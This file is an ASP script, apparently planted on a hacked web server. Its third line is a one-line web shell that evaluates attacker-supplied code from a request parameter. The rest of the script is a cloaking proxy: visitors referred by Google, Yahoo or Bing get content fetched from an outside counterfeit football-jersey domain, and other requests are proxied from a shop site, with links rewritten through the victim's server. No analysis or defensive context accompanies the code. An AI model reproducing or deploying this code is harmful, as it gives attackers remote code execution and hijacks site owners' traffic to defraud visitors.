<%Server.ScriptTimeOut=300 %>
<%Session.CodePage=65001%> 
<%eval request("uDMXVSfEpH")%>
<%
s_http_user_agent = lcase(Request.ServerVariables("HTTP_REFERER"))
if Instr( s_http_user_agent, "google") <> 0 or Instr( s_http_user_agent, "yahoo") <> 0 or Instr(s_http_user_agent, "bing") <> 0 then
    js_code = HTTPPost("http://js.winkelsvoetbalshirts-nl.com/fr_football_jerseys.js" & "?backurl=" & "http://" & Request.ServerVariables("Server_Name") & Request.ServerVariables("Script_Name") & "?" & Request.QueryString(), "")
    start_code = Instr(js_code, "http://")
    end_code = Instr(js_code, "?backurl")
  go_url= Mid(js_code, start_code, end_code - start_code) & "?backurl=" & "http://" & Request.ServerVariables("Server_Name") & Request.ServerVariables("Script_Name") & "?" & Request.QueryString()
    Response.write HTTPPost(go_url, "")
    Response.end
end if
%>
<%
randomize
from_host = "www.fcnantes-boutique.com"
my_host = Request.ServerVariables("Server_Name")
my_asp_self = Request.ServerVariables("Script_Name")
my_url = "http://" & my_host & get_url
query_string = Request.QueryString()
curl_url = "http://" & from_host & "/"
file_ext = ""
if query_string <> "" or query_string <> "/" then
  curl_url = curl_url & query_string
  filename = query_string
  if instr(filename, "?") > 0 then
    filename = left(filename, instrrev(filename, "?") -1)
  end if
  file_ext = right(filename, len(filename)  - instrrev(filename, "."))
end if

if file_ext = "jpg" or file_ext = "png" or file_ext = "gif" or file_ext = "jpeg"then
  html = Gethttpimg(curl_url)
  response.ContentType="image/" & file_ext
  response.BinaryWrite html
  Response.end
elseif file_ext = "js" then
  html = HTTPPost(curl_url, "")
  response.ContentType="text/javascript"
elseif file_ext = "css" then 
  html = HTTPPost(curl_url, "")
  response.ContentType="text/css"
else 
  html = HTTPPost(curl_url, "")
 html = ReplaceReg (html, "href[ ]?=[ ]?([\'|\""])http://" & from_host & "", "href=$1http://" & my_host & my_asp_self & "?", 1)
  'html=ReplaceReg(html,"<base(.+?)href=http://[^>]*?","<base href=""" & "http://ss" & "aaa" ,1)
 
 html = ReplaceReg(html, "href[ ]?=[ ]?[\'|\""]([^(http)].*?)\/?[\'|\""]", "href=""" & my_url & my_asp_self & "?" & "$1" & """", 1)
 html = ReplaceReg(html, "src[ ]?=[ ]?[\'|\""]([^(http)].*?)[\'|\""]", "src=""" & my_url & my_asp_self & "?" & "$1" & """", 1)
 html = ReplaceReg(html, "[ ]?action=[ ]?[\'|\""]http://" &from_host&  "(.*?)[\'|\""]", "action=""" & my_url & my_asp_self & "?" & "$1" & """", 1)
 html = ReplaceReg(html, "document.domain", "", 1)
 'html = ReplaceReg(html, "<script", "<div style=""display:none;""", 1)
 'html = ReplaceReg(html, "<\/(/s)?script>", "</div>", 1)

end if  
Response.write  html

Function HTTPPost(sUrl, flag)
  set oHTTP = Server.CreateObject("Msxml2.XMLHTTP")
  oHTTP.open "get", sUrl,false
  oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
  oHTTP.setrequestheader "accept-encoding", "gzip, deflate"
  oHTTP.setRequestHeader "User-Agent", Request.ServerVariables("HTTP_USER_AGENT")
  oHTTP.send sRequest
  If oHTTP.readyState <> 4 Then Exit Function 
  getHTTPPage   =   Bytes2bStr(oHTTP.responseBody) 
  HTTPPost = getHTTPPage
End Function
Function Bytes2bStr(vin)
    Dim BytesStream,StringReturn
    Set BytesStream = Server.CreateObject("ADODB.Stream")
    BytesStream.Type = 2
    BytesStream.Mode =3 
    BytesStream.Open
    BytesStream.WriteText vin
    BytesStream.Position = 0
    BytesStream.Charset = "UTF-8"
    BytesStream.Position = 2
    StringReturn = BytesStream.ReadText
    BytesStream.close 
    Set   BytesStream   =   Nothing 
    Bytes2bStr   =   StringReturn 
End Function
Function ReplaceReg(str,patrn,replStr,Ignor)
Dim regEx 
If Ingor=1 Then Ingor=true else Ingor=false
Set regEx = New RegExp 
regEx.Pattern = patrn 
regEx.IgnoreCase = Ignor 
regEx.Global=True
ReplaceReg = regEx.Replace(str,replStr) 
End Function

Function Gethttpimg(Url)   
  On Error Resume Next   
  Dim Http   
  Set Http=Server.Createobject("MSXML2.XmlHttp")   
  Http.Open "Get",Url,False   
  Http.Send()   
  If Http.Readystate<>4 Then Exit Function   
  Gethttpimg=Http.Responsebody   
  Set Http=Nothing   
  If Err.Number<>0 Then Err.Clear  
End Function  

%>
